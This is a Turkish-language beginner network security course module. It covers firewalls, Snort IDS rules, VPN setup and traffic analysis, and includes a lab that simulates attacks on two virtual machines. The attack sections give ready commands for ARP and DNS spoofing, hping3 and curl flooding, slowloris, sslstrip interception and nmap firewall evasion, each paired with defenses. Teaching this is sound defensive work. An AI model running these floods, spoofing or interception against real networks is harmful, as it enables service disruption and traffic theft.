# 🛡️ Seviye 1 - Ağ Güvenliği

> **Hedef**: Ağ güvenliği temellerini öğrenmek ve temel saldırı türlerini anlamak

## 📚 İçindekiler

1. [Ağ Güvenliği Temelleri](#ağ-güvenliği-temelleri)
2. [Firewall Teknolojileri](#firewall-teknolojileri)
3. [Intrusion Detection Systems (IDS)](#intrusion-detection-systems-ids)
4. [Virtual Private Networks (VPN)](#virtual-private-networks-vpn)
5. [Ağ Saldırı Türleri](#ağ-saldırı-türleri)
6. [Ağ Güvenlik Araçları](#ağ-güvenlik-araçları)
7. [Pratik Laboratuvarlar](#pratik-laboratuvarlar)
8. [Gerçek Dünya Senaryoları](#gerçek-dünya-senaryoları)

---

## 🏗️ Ağ Güvenliği Temelleri

### 🎯 Ağ Güvenliği Hedefleri

**Defense in Depth (Derinlemesine Savunma)**:
```
┌─────────────────────────────────────┐
│           Perimeter Security        │  ← Firewall, IPS
│  ┌───────────────────────────────┐  │
│  │        Network Security       │  │  ← VLAN, NAC
│  │  ┌─────────────────────────┐  │  │
│  │  │     Host Security       │  │  │  ← Antivirus, HIPS
│  │  │  ┌───────────────────┐  │  │  │
│  │  │  │  Application      │  │  │  │  ← WAF, Code Review
│  │  │  │    Security       │  │  │  │
│  │  │  │  ┌─────────────┐  │  │  │  │
│  │  │  │  │    Data     │  │  │  │  │  ← Encryption, DLP
│  │  │  │  │  Security   │  │  │  │  │
│  │  │  │  └─────────────┘  │  │  │  │
│  │  │  └───────────────────┘  │  │  │
│  │  └─────────────────────────┘  │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

### 🔐 Ağ Güvenlik Prensipleri

#### 1. **Least Privilege (En Az Yetki)**
- Kullanıcılara sadece gerekli minimum yetki verme
- Network segmentasyonu ile erişim kontrolü
- Role-based access control (RBAC)

#### 2. **Zero Trust Model**
```
Geleneksel Model: "Trust but Verify"
Zero Trust Model: "Never Trust, Always Verify"

┌─────────────────┐    ┌─────────────────┐
│   Trusted Zone  │    │  Everything is  │
│                 │ vs │   Untrusted     │
│  Untrusted Zone │    │                 │
└─────────────────┘    └─────────────────┘
```

#### 3. **Network Segmentation**
- VLAN'lar ile mantıksal ayrım
- Subnet'ler ile fiziksel ayrım
- Micro-segmentation

---

## 🔥 Firewall Teknolojileri

### 📊 Firewall Türleri

| Tür | Katman | Özellikler | Avantajlar | Dezavantajlar |
|-----|--------|------------|------------|---------------|
| **Packet Filter** | L3-L4 | IP, Port filtreleme | Hızlı, basit | Stateless, sınırlı |
| **Stateful** | L3-L4 | Bağlantı takibi | Güvenli, akıllı | Daha yavaş |
| **Application** | L7 | Uygulama analizi | Detaylı kontrol | Yavaş, karmaşık |
| **Next-Gen** | L3-L7 | IPS, DPI, SSL inspection | Kapsamlı koruma | Pahalı, karmaşık |

### 🔧 Firewall Konfigürasyonu

#### **iptables (Linux) Örnekleri**:
```bash
#!/bin/bash
# Temel Firewall Kuralları

# Mevcut kuralları temizle
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Varsayılan politikalar
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Loopback trafiğine izin ver
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Kurulu bağlantılara izin ver
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH erişimi (port 22)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT

# Web servisi (port 80, 443)
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT

# DNS (port 53)
iptables -A INPUT -p tcp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT

# ICMP (ping) - sınırlı
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT

# Rate limiting - Brute force koruması
iptables -A INPUT -p tcp --dport 22 -m recent --name SSH --set
iptables -A INPUT -p tcp --dport 22 -m recent --name SSH --rcheck --seconds 60 --hitcount 4 -j DROP

# Log dropped packets
iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables denied: " --log-level 7

# Kuralları kaydet
iptables-save > /etc/iptables/rules.v4
```

#### **pfSense Konfigürasyonu**:
```xml
<!-- pfSense Firewall Rule Example -->
<rule>
    <type>pass</type>
    <interface>wan</interface>
    <protocol>tcp</protocol>
    <source>
        <any>1</any>
    </source>
    <destination>
        <network>wanip</network>
        <port>443</port>
    </destination>
    <descr>Allow HTTPS to web server</descr>
</rule>
```

### 🔍 Firewall Monitoring

**Log Analizi**:
```bash
# iptables loglarını izleme
tail -f /var/log/syslog | grep "iptables denied"

# En çok engellenen IP'ler
grep "iptables denied" /var/log/syslog | awk '{print $13}' | cut -d'=' -f2 | sort | uniq -c | sort -nr | head -10

# Port tarama tespiti
grep "iptables denied" /var/log/syslog | grep "DPT=22" | awk '{print $13}' | cut -d'=' -f2 | sort | uniq -c | sort -nr
```

---

## 🚨 Intrusion Detection Systems (IDS)

### 📊 IDS Türleri

#### **Network-based IDS (NIDS)**
- Ağ trafiğini izler
- Promiscuous mode'da çalışır
- Gerçek zamanlı analiz

#### **Host-based IDS (HIDS)**
- Sistem loglarını izler
- Dosya bütünlüğü kontrolü
- Sistem davranış analizi

### 🔧 Snort IDS Konfigürasyonu

**Snort Kuralı Örnekleri**:
```bash
# /etc/snort/rules/local.rules

# ICMP ping flood tespiti
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Flood"; itype:8; threshold:type both, track by_src, count 10, seconds 5; sid:1000001; rev:1;)

# Port tarama tespiti
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold:type both, track by_src, count 20, seconds 60; sid:1000002; rev:1;)

# SQL Injection tespiti
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; content:"union"; nocase; content:"select"; nocase; distance:0; within:100; sid:1000003; rev:1;)

# Brute force SSH tespiti
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; flow:to_server,established; content:"SSH-"; offset:0; depth:4; threshold:type both, track by_src, count 5, seconds 60; sid:1000004; rev:1;)

# Malware callback tespiti
alert tcp $HOME_NET any -> any any (msg:"Possible Malware Callback"; content:"User-Agent: "; content:"bot"; nocase; distance:0; within:50; sid:1000005; rev:1;)
```

**Snort Konfigürasyonu**:
```bash
# /etc/snort/snort.conf

# Network variables
var HOME_NET 192.168.1.0/24
var EXTERNAL_NET !$HOME_NET
var DNS_SERVERS $HOME_NET
var SMTP_SERVERS $HOME_NET
var HTTP_SERVERS $HOME_NET
var SQL_SERVERS $HOME_NET
var TELNET_SERVERS $HOME_NET
var SSH_SERVERS $HOME_NET

# Port variables
var HTTP_PORTS [80,443,8080,8443]
var SHELLCODE_PORTS !80
var ORACLE_PORTS 1521
var SSH_PORTS 22

# Preprocessors
preprocessor frag3_global: max_frags 65536
preprocessor frag3_engine: policy windows detect_anomalies overlap_limit 10 min_fragment_length 100 timeout 180

preprocessor stream5_global: track_tcp yes, track_udp yes, track_icmp no, max_tcp 262144, max_udp 131072, max_active_responses 2, min_response_seconds 5
preprocessor stream5_tcp: policy windows, detect_anomalies, require_3whs 180, overlap_limit 10, small_segments 3 bytes 150, timeout 180, ports client 21 22 23 25 42 53 79 109 110 111 113 119 135 136 137 139 143 161 445 513 514 587 593 691 1433 1521 2100 3306 6665 6666 6667 6668 6669 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779, ports both 80 443 465 563 636 989 992 993 994 995 7801 7802 7803 7804 7805 7806 7807 7808 7809 7810 7811 7812 7813 7814 7815 7816 7817 7818 7819 7820

# Output modules
output alert_syslog: LOG_AUTH LOG_ALERT
output log_tcpdump: tcpdump.log
output database: alert, mysql, user=snort password=password dbname=snort host=localhost

# Rule files
include $RULE_PATH/local.rules
include $RULE_PATH/emerging-threats.rules
```

### 📊 SIEM Integration

**ELK Stack ile Log Analizi**:
```yaml
# logstash.conf
input {
  file {
    path => "/var/log/snort/alert"
    start_position => "beginning"
    type => "snort"
  }
}

filter {
  if [type] == "snort" {
    grok {
      match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{WORD:sensor} %{DATA:alert_msg} \[Classification: %{DATA:classification}\] \[Priority: %{NUMBER:priority}\] %{DATA} %{IP:src_ip}:%{NUMBER:src_port} -> %{IP:dest_ip}:%{NUMBER:dest_port}" }
    }
    
    date {
      match => [ "timestamp", "yyyy-MM-dd HH:mm:ss" ]
    }
    
    mutate {
      convert => { "priority" => "integer" }
      convert => { "src_port" => "integer" }
      convert => { "dest_port" => "integer" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "snort-%{+YYYY.MM.dd}"
  }
}
```

---

## 🔐 Virtual Private Networks (VPN)

### 📊 VPN Türleri

| Tür | Protokol | Güvenlik | Performans | Kullanım |
|-----|----------|----------|------------|----------|
| **IPSec** | ESP/AH | Çok Yüksek | Orta | Site-to-Site |
| **OpenVPN** | SSL/TLS | Yüksek | İyi | Remote Access |
| **WireGuard** | ChaCha20 | Yüksek | Çok İyi | Modern VPN |
| **PPTP** | MPPE | Düşük | Yüksek | Eski sistemler |
| **L2TP/IPSec** | IPSec | Yüksek | Orta | Windows entegrasyonu |

### 🔧 OpenVPN Server Kurulumu

**Server Konfigürasyonu**:
```bash
# /etc/openvpn/server.conf

port 1194
proto udp
dev tun

# SSL/TLS root certificate (ca), certificate
# (cert), and private key (key)
ca ca.crt
cert server.crt
key server.key

# Diffie hellman parameters
dh dh2048.pem

# Network topology
topology subnet

# Configure server mode and supply a VPN subnet
server 10.8.0.0 255.255.255.0

# Maintain a record of client <-> virtual IP address
ifconfig-pool-persist ipp.txt

# Push routes to the client
push "route 192.168.1.0 255.255.255.0"
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"

# Enable compression
comp-lzo

# The keepalive directive causes ping-like
keepalive 10 120

# TLS-Auth
tls-auth ta.key 0

# Select a cryptographic cipher
cipher AES-256-CBC

# Enable compression on the VPN link
comp-lzo

# The maximum number of concurrently connected clients
max-clients 100

# Run as unprivileged user
user nobody
group nogroup

# The persist options will try to avoid
persist-key
persist-tun

# Output a short status file
status openvpn-status.log

# Log verbosity
verb 3

# Silence repeating messages
mute 20
```

**Client Konfigürasyonu**:
```bash
# client.ovpn

client
dev tun
proto udp
remote your-server-ip 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client.crt
key client.key
tls-auth ta.key 1
cipher AES-256-CBC
comp-lzo
verb 3
```

### 🔧 WireGuard Konfigürasyonu

**Server Konfigürasyonu**:
```ini
# /etc/wireguard/wg0.conf

[Interface]
PrivateKey = SERVER_PRIVATE_KEY
Address = 10.0.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = CLIENT_PUBLIC_KEY
AllowedIPs = 10.0.0.2/32
```

**Client Konfigürasyonu**:
```ini
# client.conf

[Interface]
PrivateKey = CLIENT_PRIVATE_KEY
Address = 10.0.0.2/24
DNS = 8.8.8.8

[Peer]
PublicKey = SERVER_PUBLIC_KEY
Endpoint = your-server-ip:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

---

## ⚔️ Ağ Saldırı Türleri

### 🎭 ARP Spoofing/Poisoning

**Saldırı Prensibi**:
```
Normal ARP:
1. Host A: "192.168.1.1'in MAC adresi nedir?" (Broadcast)
2. Router: "192.168.1.1 benim, MAC: aa:bb:cc:dd:ee:ff"

ARP Spoofing:
1. Host A: "192.168.1.1'in MAC adresi nedir?" (Broadcast)
2. Saldırgan: "192.168.1.1 benim, MAC: 11:22:33:44:55:66" (Sahte)
3. Host A: Trafiği saldırgana gönderir
```

**Ettercap ile ARP Spoofing**:
```bash
# Hedefleri tarama
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Tüm ağı hedef alma
ettercap -T -M arp:remote /192.168.1.1// //

# DNS spoofing ile birlikte
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// //
```

**Korunma Yöntemleri**:
```bash
# Statik ARP tablosu
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# ARP monitoring
arpwatch -i eth0

# Switch port security
switchport port-security
switchport port-security mac-address sticky
```

### 🌊 DNS Spoofing

**Saldırı Senaryosu**:
```bash
# /etc/ettercap/etter.dns
# DNS spoofing konfigürasyonu

www.bank.com      A   192.168.1.100
*.facebook.com    A   192.168.1.100
*.google.com      A   192.168.1.100
```

**Korunma**:
```bash
# DNS over HTTPS (DoH)
nslookup google.com 1.1.1.1

# DNS over TLS (DoT)
dig @1.1.1.1 +tls google.com

# DNSSEC doğrulama
dig +dnssec google.com
```

### 💥 DDoS Saldırıları

#### **Volumetric Attacks**
```bash
# UDP Flood
hping3 -2 -p 80 --flood target.com

# ICMP Flood
hping3 -1 --flood target.com

# SYN Flood
hping3 -S -p 80 --flood target.com
```

#### **Application Layer Attacks**
```bash
# HTTP GET Flood
for i in {1..1000}; do
  curl -H "User-Agent: Bot$i" http://target.com/ &
done

# Slowloris Attack
slowloris.py target.com -p 80 -s 1000
```

**DDoS Korunma**:
```bash
# Rate limiting (iptables)
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# SYN flood koruması
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
echo 2048 > /proc/sys/net/ipv4/tcp_max_syn_backlog

# Connection tracking
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m conntrack --ctstate NEW -m limit --limit 50/second --limit-burst 100 -j ACCEPT
```

### 🕵️ Man-in-the-Middle (MITM)

**SSL Strip Saldırısı**:
```bash
# sslstrip kurulumu
apt-get install sslstrip

# Traffic yönlendirme
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# sslstrip başlatma
sslstrip -l 8080

# ARP spoofing ile birlikte
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

**Korunma**:
```bash
# HSTS (HTTP Strict Transport Security)
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Certificate pinning
# Public key pinning
Public-Key-Pins: pin-sha256="base64+primary=="; pin-sha256="base64+backup=="; max-age=5184000
```

---

## 🛠️ Ağ Güvenlik Araçları

### 🔍 Network Scanning

**Nmap Gelişmiş Kullanım**:
```bash
# Stealth SYN scan
nmap -sS -T4 -A -v target.com

# UDP scan
nmap -sU --top-ports 1000 target.com

# Script scanning
nmap --script vuln target.com
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script http-enum target.com

# Timing templates
nmap -T0  # Paranoid (çok yavaş)
nmap -T1  # Sneaky (yavaş)
nmap -T2  # Polite (normal)
nmap -T3  # Normal (varsayılan)
nmap -T4  # Aggressive (hızlı)
nmap -T5  # Insane (çok hızlı)

# Firewall evasion
nmap -f target.com                    # Fragment packets
nmap -D RND:10 target.com            # Decoy scan
nmap --source-port 53 target.com     # Source port manipulation
nmap --data-length 25 target.com     # Append random data
```

### 📊 Network Monitoring

**Wireshark Gelişmiş Filtreler**:
```bash
# Şüpheli trafik
tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size <= 1024

# DNS tunneling tespiti
dns and frame.len > 512

# Beaconing trafik
http.request and frame.time_delta > 60

# Credential harvesting
http.request.method == "POST" and (http contains "password" or http contains "login")

# Malware C&C
tcp.port == 443 and ssl.handshake.type == 1 and ssl.handshake.extensions_server_name contains ".tk"
```

**tshark Komut Satırı**:
```bash
# Live capture ve analiz
tshark -i eth0 -f "tcp port 80" -T fields -e ip.src -e ip.dst -e http.host

# Dosyadan analiz
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri

# İstatistikler
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z http,tree
```

### 🔧 Network Security Tools

**Nessus Vulnerability Scanner**:
```bash
# Nessus kurulumu
wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/12345/download?i_agree_to_tenable_license_agreement=true
dpkg -i Nessus-8.15.0-ubuntu1110_amd64.deb

# Servis başlatma
systemctl start nessusd
systemctl enable nessusd

# Web arayüzü: https://localhost:8834
```

**OpenVAS Kurulumu**:
```bash
# OpenVAS kurulumu (Kali Linux)
apt update && apt install openvas

# Kurulum ve konfigürasyon
gvm-setup

# Servis başlatma
gvm-start

# Web arayüzü: https://localhost:9392
```

---

## 🧪 Pratik Laboratuvarlar

### 🔬 Lab 1: Firewall Konfigürasyonu

**Hedef**: Temel firewall kuralları oluşturmak

**Senaryo**: Web sunucusu için güvenlik kuralları

**Adımlar**:
```bash
# 1. Mevcut kuralları temizle
sudo iptables -F
sudo iptables -X

# 2. Varsayılan politikaları ayarla
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 3. Loopback trafiğine izin ver
sudo iptables -A INPUT -i lo -j ACCEPT

# 4. Kurulu bağlantılara izin ver
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 5. SSH erişimi (sadece belirli IP'den)
sudo iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT

# 6. Web servisi
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 7. Rate limiting
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# 8. Kuralları test et
curl -I http://localhost
nmap -p 22,80,443 localhost

# 9. Kuralları kaydet
sudo iptables-save > /etc/iptables/rules.v4
```

### 🔬 Lab 2: IDS Kurulumu ve Konfigürasyonu

**Hedef**: Snort IDS kurmak ve konfigüre etmek

**Adımlar**:
```bash
# 1. Snort kurulumu
sudo apt update
sudo apt install snort

# 2. Ağ konfigürasyonu
sudo nano /etc/snort/snort.conf
# HOME_NET değişkenini ayarla

# 3. Özel kurallar oluştur
sudo nano /etc/snort/rules/local.rules

# Port tarama tespiti
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; flags:S; threshold:type both, track by_src, count 10, seconds 60; sid:1000001;)

# ICMP flood tespiti
alert icmp any any -> $HOME_NET any (msg:"ICMP Flood"; itype:8; threshold:type both, track by_src, count 10, seconds 5; sid:1000002;)

# 4. Snort'u test modunda çalıştır
sudo snort -T -c /etc/snort/snort.conf

# 5. Snort'u daemon modunda başlat
sudo snort -D -c /etc/snort/snort.conf -i eth0

# 6. Logları izle
sudo tail -f /var/log/snort/alert

# 7. Test saldırıları yap
nmap -sS localhost
ping -f localhost
```

### 🔬 Lab 3: VPN Kurulumu

**Hedef**: OpenVPN server kurmak

**Adımlar**:
```bash
# 1. OpenVPN kurulumu
sudo apt install openvpn easy-rsa

# 2. CA kurulumu
make-cadir ~/openvpn-ca
cd ~/openvpn-ca

# 3. CA değişkenlerini düzenle
nano vars
export KEY_COUNTRY="TR"
export KEY_PROVINCE="Istanbul"
export KEY_CITY="Istanbul"
export KEY_ORG="MyCompany"
export KEY_EMAIL="admin@mycompany.com"
export KEY_OU="IT"

# 4. CA oluştur
source vars
./clean-all
./build-ca

# 5. Server sertifikası oluştur
./build-key-server server

# 6. Diffie-Hellman parametreleri
./build-dh

# 7. TLS-Auth key
openvpn --genkey --secret keys/ta.key

# 8. Client sertifikası
./build-key client1

# 9. Server konfigürasyonu
sudo cp ~/openvpn-ca/keys/{server.crt,server.key,ca.crt,dh2048.pem,ta.key} /etc/openvpn/
sudo nano /etc/openvpn/server.conf

# 10. OpenVPN servisini başlat
sudo systemctl start openvpn@server
sudo systemctl enable openvpn@server

# 11. Client konfigürasyon dosyası oluştur
# client.ovpn dosyasını hazırla
```

### 🔬 Lab 4: Ağ Saldırı Simülasyonu

**Hedef**: Kontrollü ortamda ağ saldırıları test etmek

**Gereksinimler**: 2 VM (Kali Linux + Ubuntu)

**Adımlar**:
```bash
# Kali Linux (Saldırgan)

# 1. Ağ keşfi
nmap -sn 192.168.1.0/24

# 2. Hedef tarama
nmap -sS -A 192.168.1.100

# 3. ARP spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# 4. DNS spoofing
# /etc/ettercap/etter.dns dosyasını düzenle
echo "www.google.com A 192.168.1.50" >> /etc/ettercap/etter.dns
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//

# 5. SSL Strip
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Ubuntu (Hedef)

# 1. Ağ trafiğini izle
sudo tcpdump -i eth0 -w capture.pcap

# 2. ARP tablosunu kontrol et
arp -a
watch -n 1 arp -a

# 3. DNS sorgularını test et
nslookup www.google.com

# 4. HTTPS bağlantılarını test et
curl -I https://www.google.com
```

---

## 🌍 Gerçek Dünya Senaryoları

### 🏢 Senaryo 1: Kurumsal Ağ Güvenliği

**Durum**: 500 kişilik şirket, hibrit çalışma modeli

**Gereksinimler**:
- Remote access VPN
- Network segmentation
- IDS/IPS sistemi
- Firewall politikaları

**Çözüm Mimarisi**:
```
Internet
    |
[Firewall/UTM]
    |
[DMZ] - Web Server, Mail Server
    |
[Core Switch]
    |
+-- [VLAN 10] Management
+-- [VLAN 20] Servers
+-- [VLAN 30] Users
+-- [VLAN 40] Guests
+-- [VLAN 50] IoT Devices
```

**Güvenlik Politikaları**:
```bash
# VLAN arası erişim kuralları
# Users -> Servers (sadece gerekli portlar)
iptables -A FORWARD -s 192.168.30.0/24 -d 192.168.20.0/24 -p tcp --dport 80,443 -j ACCEPT

# Management -> All (admin erişimi)
iptables -A FORWARD -s 192.168.10.0/24 -j ACCEPT

# Guests -> Internet only
iptables -A FORWARD -s 192.168.40.0/24 -d 192.168.0.0/16 -j DROP
iptables -A FORWARD -s 192.168.40.0/24 -o eth0 -j ACCEPT

# IoT -> Isolated
iptables -A FORWARD -s 192.168.50.0/24 -d 192.168.0.0/16 -j DROP
```

### 🏥 Senaryo 2: Hastane Ağ Güvenliği

**Durum**: HIPAA uyumluluğu gereken hastane

**Kritik Gereksinimler**:
- Hasta verisi koruması
- Medikal cihaz güvenliği
- Audit logging
- Incident response

**Güvenlik Mimarisi**:
```
[Medical Devices VLAN] - Isolated, monitored
[Patient Data VLAN] - Encrypted, access controlled
[Staff VLAN] - Role-based access
[Guest VLAN] - Internet only
```

**Monitoring ve Compliance**:
```bash
# HIPAA audit logging
rsyslog configuration for centralized logging
SIEM rules for data access monitoring
DLP (Data Loss Prevention) policies
Encryption at rest and in transit
```

### 🏭 Senaryo 3: Endüstriyel Ağ Güvenliği (OT)

**Durum**: Üretim tesisi, SCADA sistemleri

**Özel Gereksinimler**:
- Air-gapped networks
- Legacy system support
- Real-time monitoring
- Safety systems protection

**Purdue Model Implementation**:
```
Level 4: Business Network
Level 3: Manufacturing Operations
Level 2: Supervisory Control (SCADA/HMI)
Level 1: Basic Control (PLC/DCS)
Level 0: Physical Process
```

---

## 📚 Ek Kaynaklar

### 📖 Önerilen Kitaplar
- "Network Security Essentials" - William Stallings
- "Firewalls and Internet Security" - Cheswick & Bellovin
- "Intrusion Detection and Prevention" - Carl Endorf
- "VPNs Illustrated" - Jon Snader

### 🛠️ Pratik Araçlar
```bash
# Network Security
nmap, masscan, zmap          # Network scanning
wireshark, tcpdump, tshark   # Packet analysis
snort, suricata, zeek        # IDS/IPS
openvpn, strongswan          # VPN

# Penetration Testing
ettercap, bettercap          # MITM attacks
hping3, scapy               # Packet crafting
aircrack-ng                 # Wireless security
metasploit                  # Exploitation framework

# Monitoring
nagios, zabbix              # Network monitoring
splunk, elk                 # Log analysis
ntopng, darkstat            # Traffic analysis
```

### 🌐 Online Platformlar
- **TryHackMe**: Network Security room
- **HackTheBox**: Network penetration testing
- **VulnHub**: Vulnerable VMs
- **SANS NetWars**: Network security challenges

---

## ✅ Seviye 1 - Ağ Güvenliği Tamamlama Kriterleri

### 📋 Teorik Bilgi
- [ ] Firewall türlerini ve konfigürasyonunu bilme
- [ ] IDS/IPS sistemlerini anlama
- [ ] VPN teknolojilerini karşılaştırabilme
- [ ] Ağ saldırı türlerini tanımlayabilme
- [ ] Defense in Depth prensibini uygulayabilme

### 🛠️ Pratik Beceriler
- [ ] iptables ile firewall kuralları yazabilme
- [ ] Snort IDS konfigüre edebilme
- [ ] OpenVPN server kurabilme
- [ ] Ağ saldırılarını tespit edebilme
- [ ] Wireshark ile trafik analizi yapabilme

### 🎯 Lab Tamamlama
- [ ] Lab 1: Firewall konfigürasyonu tamamlandı
- [ ] Lab 2: IDS kurulumu tamamlandı
- [ ] Lab 3: VPN kurulumu tamamlandı
- [ ] Lab 4: Saldırı simülasyonu tamamlandı

### 📈 Sonraki Adım
**Seviye 2'ye geçiş için hazır mısınız?**

✅ Tüm kriterleri karşıladıysanız → [Seviye 2 - Penetrasyon Testi](../level-2/penetration-testing.md)

❌ Eksik alanlarınız varsa → Bu bölümü tekrar gözden geçirin

---

**🎯 Hedef Tamamlandı**: Ağ güvenliği temellerini öğrendiniz!

**📚 Sonraki Ders**: [OWASP Top 10](./owasp-top10.md)

---

*Son güncelleme: 2025 | Seviye: Başlangıç | Süre: 2-3 hafta*